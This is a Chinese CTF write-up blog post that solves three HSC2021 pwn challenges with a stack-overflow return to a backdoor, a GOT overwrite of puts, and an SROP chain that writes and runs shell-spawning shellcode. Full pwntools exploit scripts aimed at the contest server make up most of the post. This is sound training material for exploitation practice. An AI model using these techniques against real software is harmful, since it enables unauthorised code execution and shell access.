---
title: HSC2021-CTF-pwn
categories: [CTF]
tags: [wp,pwn]

---
红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了......<!--more-->

## EZ_pwn

真ez pwn 题目给了后门，栈溢出改RIP为后门地址。

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2022/02/20 11:12:39
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=0
elf='./Ez_pwn'
e=ELF(elf)
context.arch=e.arch
#context.log_level = 'debug'
ip_port=['hsc2019.site',10366]

debug=lambda gdb_cmd='': gdb.attach(p,gdb_cmd) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

debug()
p.sendline('1'*0x40+'2'*8+p64(e.sym['backdoor']))
p.interactive()
```

## EZPWN

题目给了后门。分析程序流程，发现题目有个任意执行写，篡改put函数的got表值虫二劫持got表运行后门

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2022/02/20 11:21:21
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./EZPWN'
e=ELF(elf)
context.arch=e.arch
#context.log_level = 'debug'
ip_port=['hsc2019.site',10027]

debug=lambda gdb_cmd='': gdb.attach(p,gdb_cmd) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

p.recvuntil('your ID?')
p.sendline('xxxxx')
debug()
p.recvuntil('Give me the target address?')
p.sendline(str(0x601018))
p.recvuntil('Give me the data:')
p.sendline(p64(e.sym['success']))
p.interactive()
```

## SAHELL

题目欺诈，实际上考的是SROT与写shell。

即及利用SPOT在一块可以控制地址区域写入shellcode，让后再调用shellcode。

但要注意的是这里连续调用两次syscall.

第一次我们利用syscall  通过SYS_rt_sigreturn 劫持栈与程序流。

但是SYS_rt_sigreturn的系统调用号为`0xf`.

因此我们用利用x64下系统调用read的返回值为输入字符数来篡改返回值（rax）为`0xf`

同时，由于我们连续调用syscall，且rt_sigreturn破坏原本栈结构。我们伪造的`signal Frame`也要注意各寄存器外，`uc_stack`和`Segment Registers(SS, FS, GS, CS)`等参数也要注意实际情况。

```PYTHON
#推荐模板：
sigret_frame = [
    p64(0x0000000000000007),   # uc_flags
    p64(0x0000000000000000),   # uc_link
    p64(0x0000000000000000),   # uc_stack.ss_sp
    p64(0x0000ffff00000000),   # uc_stack.ss_flags
    p64(0x0000000000000000),   # uc_stack.ss_size
    p64(0xdeadbeefdeadbeef),   # R8
    p64(0xdeadbeefdeadbeef),   # R9
    p64(0xdeadbeefdeadbeef),   # R10
    p64(0xdeadbeefdeadbeef),   # R11
    p64(0xdeadbeefdeadbeef),   # R12
    p64(0xdeadbeefdeadbeef),   # R13
    p64(0xdeadbeefdeadbeef),   # R14
    p64(0xdeadbeefdeadbeef),   # R15
    p64(0x0000000000402000),   # RDI
    p64(0x0000000000000000),   # RSI
    p64(0xdeadbeefdeadbeef),   # RBP
    p64(0xdeadbeefdeadbeef),   # RBX
    p64(0x0000000000000000),   # RDX
    p64(0x000000000000003b),   # RAX
    p64(0xdeadbeefdeadbeef),   # RCX
    p64(0xdeadbeefdeadbeef),   # RSP
    p64(SYSCALL),   # RIP = should call 'syscall' instruction
    p64(0x0000000000000202),   # EFLAGS
    p64(0x002b000000000033),   # Segment Registers(SS, FS, GS, CS)
    p64(0x0000000000000000),   # ERR
    p64(0x0000000000000001),   # TrapNo
    p64(0x0000000000000000),   # Old-Mask
    p64(0x0000000000000000),   # CR2
    p64(0x0000000000000000),   # fpstate = NULL
    p64(0x000000000000000e),   # reserved
    p64(0x0000000000000000),   # uc_sigmask
]

```

同时，由于SYS_rt_sigreturn的返回值刚好为0，即read的系统调用号，我们就可以直接将RIP修改为syscall地址。就可以执行sys_read调用写入并指向shellcode

完整exp：

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2022/02/20 11:39:04
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=0
elf='./SAHELL'
e=ELF(elf)
context.arch=e.arch
context.log_level = 'debug'
ip_port=['hsc2019.site',10774]

debug=lambda gdb_cmd='': gdb.attach(p,gdb_cmd) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])


#
#debug('b main')
#debug()
shellcodeaddr=0x00600000
rbp=shellcodeaddr
#asm(shellcraft.sh())
sleep(1)

"""
sigret_frame = [
    p64(0x0000000000000007),   # uc_flags
    p64(0x0000000000000000),   # uc_link
    p64(0x0000000000000000),   # uc_stack.ss_sp
    p64(0x0000ffff00000000),   # uc_stack.ss_flags
    p64(0x0000000000000000),   # uc_stack.ss_size
    p64(0xdeadbeefdeadbeef),   # R8
    p64(0xdeadbeefdeadbeef),   # R9
    p64(0xdeadbeefdeadbeef),   # R10
    p64(0xdeadbeefdeadbeef),   # R11
    p64(0xdeadbeefdeadbeef),   # R12
    p64(0xdeadbeefdeadbeef),   # R13
    p64(0xdeadbeefdeadbeef),   # R14
    p64(0xdeadbeefdeadbeef),   # R15
    p64(0x0000000000402000),   # RDI
    p64(0x0000000000000000),   # RSI
    p64(0xdeadbeefdeadbeef),   # RBP
    p64(0xdeadbeefdeadbeef),   # RBX
    p64(0x0000000000000000),   # RDX
    p64(0x000000000000003b),   # RAX
    p64(0xdeadbeefdeadbeef),   # RCX
    p64(0xdeadbeefdeadbeef),   # RSP
    p64(SYSCALL),   # RIP = should call 'syscall' instruction
    p64(0x0000000000000202),   # EFLAGS
    p64(0x002b000000000033),   # Segment Registers(SS, FS, GS, CS)
    p64(0x0000000000000000),   # ERR
    p64(0x0000000000000001),   # TrapNo
    p64(0x0000000000000000),   # Old-Mask
    p64(0x0000000000000000),   # CR2
    p64(0x0000000000000000),   # fpstate = NULL
    p64(0x000000000000000e),   # reserved
    p64(0x0000000000000000),   # uc_sigmask
]

"""

p.sendline('x'*0x1a0+p64(0x000000000400108-0x50)+p64(0x0000000004000BA)+p64(0x0000000004000B5)+p64(0x0000000000000007)+p64(0x0000000000000000)+p64(0x0000000000000000)+p64(0x0000ffff00000000)+p64(0x0000000000000000)+'a'*0x28+'b'*0x10+'c'*8+p64(0x0)+p64(0x600100)+'q'*8+'y'*8+p64(0x1000)+p64(0)*2+p64(0x600100)+p64(0x0000000004000CB)+p64(0x0000000000000202)+p64(0x002b000000000033)+ p64(0x0000000000000000)+p64(0x0000000000000001)+p64(0x0000000000000000)+p64(0x0000000000000000)+p64(0x0000000000000000)+p64(0x000000000000000e))
sleep(4)
#debug()
p.sendline('1'*(0xf-1))
sleep(3)

p.sendline('8'*64+p64(0x600148+8)+p64(0)+(asm(shellcraft.sh())))
p.interactive()
```

